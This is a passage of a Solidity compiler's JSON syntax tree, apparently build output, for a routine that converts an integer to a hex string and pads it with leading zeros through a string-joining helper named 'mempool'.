																		"src": "5959:3:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bytes_memory_ptr",
																			"typeString": "bytes memory"
																		}
																	},
																	"id": 544,
																	"indexExpression": {
																		"commonType": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		},
																		"id": 543,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftExpression": {
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 541,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"id": 539,
																				"name": "count",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 496,
																				"src": "5963:5:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "-",
																			"rightExpression": {
																				"id": 540,
																				"name": "i",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 523,
																				"src": "5971:1:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"src": "5963:9:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "BinaryOperation",
																		"operator": "-",
																		"rightExpression": {
																			"hexValue": "31",
																			"id": 542,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "number",
																			"lValueRequested": false,
																			"nodeType": "Literal",
																			"src": "5975:1:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_rational_1_by_1",
																				"typeString": "int_const 1"
																			},
																			"value": "1"
																		},
																		"src": "5963:13:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": true,
																	"nodeType": "IndexAccess",
																	"src": "5959:18:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes1",
																		"typeString": "bytes1"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"arguments": [
																		{
																			"arguments": [
																				{
																					"id": 548,
																					"name": "b",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 500,
																					"src": "5997:1:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				],
																				"id": 547,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"lValueRequested": false,
																				"nodeType": "ElementaryTypeNameExpression",
																				"src": "5991:5:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_type$_t_uint8_$",
																					"typeString": "type(uint8)"
																				},
																				"typeName": {
																					"id": 546,
																					"name": "uint8",
																					"nodeType": "ElementaryTypeName",
																					"src": "5991:5:0",
																					"typeDescriptions": {}
																				}
																			},
																			"id": 549,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "typeConversion",
																			"lValueRequested": false,
																			"nameLocations": [],
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "5991:8:0",
																			"tryCall": false,
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		],
																		"id": 545,
																		"name": "toHexDigit",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 834,
																		"src": "5980:10:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_function_internal_pure$_t_uint8_$returns$_t_bytes1_$",
																			"typeString": "function (uint8) pure returns (bytes1)"
																		}
																	},
																	"id": 550,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "functionCall",
																	"lValueRequested": false,
																	"nameLocations": [],
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "5980:20:0",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes1",
																		"typeString": "bytes1"
																	}
																},
																"src": "5959:41:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bytes1",
																	"typeString": "bytes1"
																}
															},
															"id": 552,
															"nodeType": "ExpressionStatement",
															"src": "5959:41:0"
														},
														{
															"expression": {
																"id": 555,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"id": 553,
																	"name": "a",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 490,
																	"src": "6015:1:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "/=",
																"rightHandSide": {
																	"hexValue": "3136",
																	"id": 554,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "6020:2:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_16_by_1",
																		"typeString": "int_const 16"
																	},
																	"value": "16"
																},
																"src": "6015:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 556,
															"nodeType": "ExpressionStatement",
															"src": "6015:7:0"
														}
													]
												},
												"condition": {
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 528,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"id": 526,
														"name": "i",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 523,
														"src": "5905:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"id": 527,
														"name": "count",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 496,
														"src": "5907:5:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "5905:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 558,
												"initializationExpression": {
													"assignments": [
														523
													],
													"declarations": [
														{
															"constant": false,
															"id": 523,
															"mutability": "mutable",
															"name": "i",
															"nameLocation": "5900:1:0",
															"nodeType": "VariableDeclaration",
															"scope": 558,
															"src": "5895:6:0",
															"stateVariable": false,
															"storageLocation": "default",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"typeName": {
																"id": 522,
																"name": "uint",
																"nodeType": "ElementaryTypeName",
																"src": "5895:4:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"visibility": "internal"
														}
													],
													"id": 525,
													"initialValue": {
														"hexValue": "30",
														"id": 524,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "5902:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"nodeType": "VariableDeclarationStatement",
													"src": "5895:8:0"
												},
												"loopExpression": {
													"expression": {
														"id": 530,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"nodeType": "UnaryOperation",
														"operator": "++",
														"prefix": true,
														"src": "5914:3:0",
														"subExpression": {
															"id": 529,
															"name": "i",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 523,
															"src": "5916:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 531,
													"nodeType": "ExpressionStatement",
													"src": "5914:3:0"
												},
												"nodeType": "ForStatement",
												"src": "5890:144:0"
											},
											{
												"assignments": [
													560
												],
												"declarations": [
													{
														"constant": false,
														"id": 560,
														"mutability": "mutable",
														"name": "hexLength",
														"nameLocation": "6049:9:0",
														"nodeType": "VariableDeclaration",
														"scope": 643,
														"src": "6044:14:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 559,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "6044:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 569,
												"initialValue": {
													"expression": {
														"arguments": [
															{
																"arguments": [
																	{
																		"id": 565,
																		"name": "res",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 516,
																		"src": "6074:3:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bytes_memory_ptr",
																			"typeString": "bytes memory"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_bytes_memory_ptr",
																			"typeString": "bytes memory"
																		}
																	],
																	"id": 564,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "6067:6:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_string_storage_ptr_$",
																		"typeString": "type(string storage pointer)"
																	},
																	"typeName": {
																		"id": 563,
																		"name": "string",
																		"nodeType": "ElementaryTypeName",
																		"src": "6067:6:0",
																		"typeDescriptions": {}
																	}
																},
																"id": 566,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "typeConversion",
																"lValueRequested": false,
																"nameLocations": [],
																"names": [],
																"nodeType": "FunctionCall",
																"src": "6067:11:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_string_memory_ptr",
																	"typeString": "string memory"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_string_memory_ptr",
																	"typeString": "string memory"
																}
															],
															"id": 562,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"lValueRequested": false,
															"nodeType": "ElementaryTypeNameExpression",
															"src": "6061:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_bytes_storage_ptr_$",
																"typeString": "type(bytes storage pointer)"
															},
															"typeName": {
																"id": 561,
																"name": "bytes",
																"nodeType": "ElementaryTypeName",
																"src": "6061:5:0",
																"typeDescriptions": {}
															}
														},
														"id": 567,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "typeConversion",
														"lValueRequested": false,
														"nameLocations": [],
														"names": [],
														"nodeType": "FunctionCall",
														"src": "6061:18:0",
														"tryCall": false,
														"typeDescriptions": {
															"typeIdentifier": "t_bytes_memory_ptr",
															"typeString": "bytes memory"
														}
													},
													"id": 568,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"memberLocation": "6080:6:0",
													"memberName": "length",
													"nodeType": "MemberAccess",
													"src": "6061:25:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "6044:42:0"
											},
											{
												"condition": {
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 572,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"id": 570,
														"name": "hexLength",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 560,
														"src": "6101:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"hexValue": "34",
														"id": 571,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "6114:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_rational_4_by_1",
															"typeString": "int_const 4"
														},
														"value": "4"
													},
													"src": "6101:14:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": {
													"condition": {
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 588,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"id": 586,
															"name": "hexLength",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 560,
															"src": "6230:9:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "==",
														"rightExpression": {
															"hexValue": "33",
															"id": 587,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "6243:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_rational_3_by_1",
																"typeString": "int_const 3"
															},
															"value": "3"
														},
														"src": "6230:14:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"falseBody": {
														"condition": {
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 604,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"id": 602,
																"name": "hexLength",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 560,
																"src": "6359:9:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "==",
															"rightExpression": {
																"hexValue": "32",
																"id": 603,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "6372:1:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_2_by_1",
																	"typeString": "int_const 2"
																},
																"value": "2"
															},
															"src": "6359:14:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"falseBody": {
															"condition": {
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 620,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"id": 618,
																	"name": "hexLength",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 560,
																	"src": "6490:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "==",
																"rightExpression": {
																	"hexValue": "31",
																	"id": 619,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "6503:1:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_1_by_1",
																		"typeString": "int_const 1"
																	},
																	"value": "1"
																},
																"src": "6490:14:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"id": 634,
															"nodeType": "IfStatement",
															"src": "6486:126:0",
															"trueBody": {
																"id": 633,
																"nodeType": "Block",
																"src": "6506:106:0",
																"statements": [
																	{
																		"assignments": [
																			622
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 622,
																				"mutability": "mutable",
																				"name": "_hexC4",
																				"nameLocation": "6535:6:0",
																				"nodeType": "VariableDeclaration",
																				"scope": 633,
																				"src": "6521:20:0",
																				"stateVariable": false,
																				"storageLocation": "memory",
																				"typeDescriptions": {
																					"typeIdentifier": "t_string_memory_ptr",
																					"typeString": "string"
																				},
																				"typeName": {
																					"id": 621,
																					"name": "string",
																					"nodeType": "ElementaryTypeName",
																					"src": "6521:6:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_string_storage_ptr",
																						"typeString": "string"
																					}
																				},
																				"visibility": "internal"
																			}
																		],
																		"id": 630,
																		"initialValue": {
																			"arguments": [
																				{
																					"hexValue": "30303030",
																					"id": 624,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "string",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "6552:6:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_stringliteral_e8d1f6cb90fef5fc9696cc77858b42d4e99b0959246d86f4584b49f5af0fe3f9",
																						"typeString": "literal_string \"0000\""
																					},
																					"value": "0000"
																				},
																				{
																					"arguments": [
																						{
																							"id": 627,
																							"name": "res",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 516,
																							"src": "6567:3:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_bytes_memory_ptr",
																								"typeString": "bytes memory"
																							}
																						}
																					],
																					"expression": {
																						"argumentTypes": [
																							{
																								"typeIdentifier": "t_bytes_memory_ptr",
																								"typeString": "bytes memory"
																							}
																						],
																						"id": 626,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"lValueRequested": false,
																						"nodeType": "ElementaryTypeNameExpression",
																						"src": "6560:6:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_type$_t_string_storage_ptr_$",
																							"typeString": "type(string storage pointer)"
																						},
																						"typeName": {
																							"id": 625,
																							"name": "string",
																							"nodeType": "ElementaryTypeName",
																							"src": "6560:6:0",
																							"typeDescriptions": {}
																						}
																					},
																					"id": 628,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"kind": "typeConversion",
																					"lValueRequested": false,
																					"nameLocations": [],
																					"names": [],
																					"nodeType": "FunctionCall",
																					"src": "6560:11:0",
																					"tryCall": false,
																					"typeDescriptions": {
																						"typeIdentifier": "t_string_memory_ptr",
																						"typeString": "string memory"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_stringliteral_e8d1f6cb90fef5fc9696cc77858b42d4e99b0959246d86f4584b49f5af0fe3f9",
																						"typeString": "literal_string \"0000\""
																					},
																					{
																						"typeIdentifier": "t_string_memory_ptr",
																						"typeString": "string memory"
																					}
																				],
																				"id": 623,
																				"name": "mempool",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1188,
																				"src": "6544:7:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
																					"typeString": "function (string memory,string memory) pure returns (string memory)"
																				}
																			},
																			"id": 629,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "functionCall",
																			"lValueRequested": false,
																			"nameLocations": [],
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "6544:28:0",
																			"tryCall": false,
																			"typeDescriptions": {
																				"typeIdentifier": "t_string_memory_ptr",
																				"typeString": "string memory"
																			}
																		},
																		"nodeType": "VariableDeclarationStatement",
																		"src": "6521:51:0"
																	},
																	{
																		"expression": {
																			"id": 631,
																			"name": "_hexC4",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 622,
																			"src": "6594:6:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_string_memory_ptr",
																				"typeString": "string memory"
																			}
																		},
																		"functionReturnParameters": 494,
																		"id": 632,
																		"nodeType": "Return",
																		"src": "6587:13:0"
																	}
																]
															}
														},
														"id": 635,
														"nodeType": "IfStatement",
														"src": "6355:257:0",
														"trueBody": {
															"id": 617,
															"nodeType": "Block",
															"src": "6375:105:0",
															"statements": [
																{
																	"assignments": [
																		606
																	],
																	"declarations": [
																		{
																			"constant": false,
																			"id": 606,
																			"mutability": "mutable",
																			"name": "_hexC3",
																			"nameLocation": "6404:6:0",
																			"nodeType": "VariableDeclaration",
																			"scope": 617,
																			"src": "6390:20:0",
																			"stateVariable": false,
																			"storageLocation": "memory",
																			"typeDescriptions": {
																				"typeIdentifier": "t_string_memory_ptr",
																				"typeString": "string"
																			},
																			"typeName": {
																				"id": 605,
																				"name": "string",
																				"nodeType": "ElementaryTypeName",
																				"src": "6390:6:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_string_storage_ptr",
																					"typeString": "string"
																				}
																			},
																			"visibility": "internal"
																		}
																	],
																	"id": 614,
																	"initialValue": {
																		"arguments": [
																			{
																				"hexValue": "303030",
																				"id": 608,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "string",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "6421:5:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_stringliteral_35b5b8bece53958bb309db665734c38515f37439f69bfdbc64808f1af9a97c31",
																					"typeString": "literal_string \"000\""
																				},
																				"value": "000"
																			},
																			{
																				"arguments": [
																					{
																						"id": 611,
																						"name": "res",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 516,
																						"src": "6435:3:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_bytes_memory_ptr",
																							"typeString": "bytes memory"
																						}
																					}
																				],
																				"expression": {
																					"argumentTypes": [
																						{
																							"typeIdentifier": "t_bytes_memory_ptr",
																							"typeString": "bytes memory"
																						}
																					],
																					"id": 610,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"lValueRequested": false,
																					"nodeType": "ElementaryTypeNameExpression",
																					"src": "6428:6:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_type$_t_string_storage_ptr_$",
																						"typeString": "type(string storage pointer)"
																					},
																					"typeName": {
																						"id": 609,
																						"name": "string",
																						"nodeType": "ElementaryTypeName",
																						"src": "6428:6:0",
																						"typeDescriptions": {}
																					}
																				},
																				"id": 612,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"kind": "typeConversion",
																				"lValueRequested": false,
																				"nameLocations": [],
																				"names": [],
																				"nodeType": "FunctionCall",
																				"src": "6428:11:0",
																				"tryCall": false,
																				"typeDescriptions": {
																					"typeIdentifier": "t_string_memory_ptr",
																					"typeString": "string memory"
																				}
																			}
																		],
																		"expression": {
																			"argumentTypes": [
																				{
																					"typeIdentifier": "t_stringliteral_35b5b8bece53958bb309db665734c38515f37439f69bfdbc64808f1af9a97c31",
																					"typeString": "literal_string \"000\""
																				},
																				{
																					"typeIdentifier": "t_string_memory_ptr",
																					"typeString": "string memory"
																				}
																			],
																			"id": 607,
																			"name": "mempool",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 1188,
																			"src": "6413:7:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
																				"typeString": "function (string memory,string memory) pure returns (string memory)"
																			}
																		},
																		"id": 613,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"kind": "functionCall",
																		"lValueRequested": false,
																		"nameLocations": [],
																		"names": [],
																		"nodeType": "FunctionCall",
																		"src": "6413:27:0",
																		"tryCall": false,
																		"typeDescriptions": {
																			"typeIdentifier": "t_string_memory_ptr",
																			"typeString": "string memory"
																		}
																	},
																	"nodeType": "VariableDeclarationStatement",
																	"src": "6390:50:0"
																},
																{
																	"expression": {
																		"id": 615,
																		"name": "_hexC3",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 606,
																		"src": "6462:6:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_string_memory_ptr",
																			"typeString": "string memory"
																		}
																	},
																	"functionReturnParameters": 494,
																	"id": 616,
																	"nodeType": "Return",
																	"src": "6455:13:0"
																}
															]
														}
													},
													"id": 636,
													"nodeType": "IfStatement",
													"src": "6226:386:0",
													"trueBody": {
														"id": 601,
														"nodeType": "Block",
														"src": "6246:103:0",
														"statements": [
															{
																"assignments": [
																	590
																],
																"declarations": [
																	{
																		"constant": false,
																		"id": 590,
																		"mutability": "mutable",
																		"name": "_hexC2",
																		"nameLocation": "6275:6:0",
																		"nodeType": "VariableDeclaration",
																		"scope": 601,
																		"src": "6261:20:0",
																		"stateVariable": false,
																		"storageLocation": "memory",
																		"typeDescriptions": {
																			"typeIdentifier": "t_string_memory_ptr",
																			"typeString": "string"
																		},
																		"typeName": {
																			"id": 589,
																			"name": "string",
																			"nodeType": "ElementaryTypeName",
																			"src": "6261:6:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_string_storage_ptr",
																				"typeString": "string"
																			}
																		},
																		"visibility": "internal"
																	}
																],
																"id": 598,
																"initialValue": {
																	"arguments": [
																		{
																			"hexValue": "30",
																			"id": 592,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "string",
																			"lValueRequested": false,
																			"nodeType": "Literal",
																			"src": "6292:3:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_stringliteral_044852b2a670ade5407e78fb2863c51de9fcb96542a07186fe3aeda6bb8a116d",
																				"typeString": "literal_string \"0\""
																			},
																			"value": "0"
																		},
																		{
																			"arguments": [
																				{
																					"id": 595,
																					"name": "res",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 516,
																					"src": "6304:3:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes_memory_ptr",
																						"typeString": "bytes memory"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_bytes_memory_ptr",
																						"typeString": "bytes memory"
																					}
																				],
																				"id": 594,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"lValueRequested": false,
																				"nodeType": "ElementaryTypeNameExpression",
																				"src": "6297:6:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_type$_t_string_storage_ptr_$",
																					"typeString": "type(string storage pointer)"
																				},
																				"typeName": {
																					"id": 593,
																					"name": "string",
																					"nodeType": "ElementaryTypeName",
																					"src": "6297:6:0",
																					"typeDescriptions": {}
																				}
																			},
																			"id": 596,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "typeConversion",
																			"lValueRequested": false,
																			"nameLocations": [],
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "6297:11:0",
																			"tryCall": false,
																			"typeDescriptions": {
																				"typeIdentifier": "t_string_memory_ptr",
																				"typeString": "string memory"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_stringliteral_044852b2a670ade5407e78fb2863c51de9fcb96542a07186fe3aeda6bb8a116d",
																				"typeString": "literal_string \"0\""
																			},
																			{
																				"typeIdentifier": "t_string_memory_ptr",
																				"typeString": "string memory"
																			}
																		],
																		"id": 591,
																		"name": "mempool",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1188,
																		"src": "6284:7:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
																			"typeString": "function (string memory,string memory) pure returns (string memory)"
																		}
																	},
																	"id": 597,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "functionCall",
																	"lValueRequested": false,
																	"nameLocations": [],
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "6284:25:0",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																},
																"nodeType": "VariableDeclarationStatement",
																"src": "6261:48:0"
															},
															{
																"expression": {
																	"id": 599,
																	"name": "_hexC2",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 590,
																	"src": "6331:6:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																},
																"functionReturnParameters": 494,
																"id": 600,
																"nodeType": "Return",
																"src": "6324:13:0"
															}
														]
													}
												},
												"id": 637,
												"nodeType": "IfStatement",
												"src": "6097:515:0",
												"trueBody": {
													"id": 585,
													"nodeType": "Block",
													"src": "6117:103:0",
													"statements": [
														{
															"assignments": [
																574
															],
															"declarations": [
																{
																	"constant": false,
																	"id": 574,
																	"mutability": "mutable",
																	"name": "_hexC1",
																	"nameLocation": "6146:6:0",
																	"nodeType": "VariableDeclaration",
																	"scope": 585,
																	"src": "6132:20:0",
																	"stateVariable": false,
																	"storageLocation": "memory",
																	"typeDescriptions": {
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string"
																	},
																	"typeName": {
																		"id": 573,
																		"name": "string",
																		"nodeType": "ElementaryTypeName",
																		"src": "6132:6:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_string_storage_ptr",
																			"typeString": "string"
																		}
																	},
																	"visibility": "internal"
																}
															],
															"id": 582,
															"initialValue": {
																"arguments": [
																	{
																		"hexValue": "30",
																		"id": 576,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "string",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "6163:3:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_stringliteral_044852b2a670ade5407e78fb2863c51de9fcb96542a07186fe3aeda6bb8a116d",
																			"typeString": "literal_string \"0\""
																		},
																		"value": "0"
																	},
																	{
																		"arguments": [
																			{
																				"id": 579,
																				"name": "res",
